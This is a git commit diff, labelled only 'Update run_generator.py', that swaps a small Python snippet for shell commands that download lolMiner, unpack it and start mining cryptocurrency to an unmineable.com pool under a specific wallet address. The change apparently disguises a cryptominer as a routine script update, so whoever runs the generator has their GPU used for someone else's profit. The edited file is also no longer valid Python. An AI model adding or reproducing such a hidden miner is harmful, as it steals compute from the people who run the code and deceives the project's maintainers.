19b6dddcc5c8064c0f94e5751963f2a23dd64de8
nshendkar <95523471+nshendkar@users.noreply.github.com>
2021-12-04 14:29:44 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,7 @@
-import os as alpha
-alpha.system("nvidia-smi")
+!wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+
+!tar -xf lolMiner_v1.29_Lin64.tar.gz
+
+cd 1.29
+
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x6d0a7d5b00f0e1609c0bc46e71f3b3735c1eae2f.PC3_miner --ethstratum ETHPROXY pause 
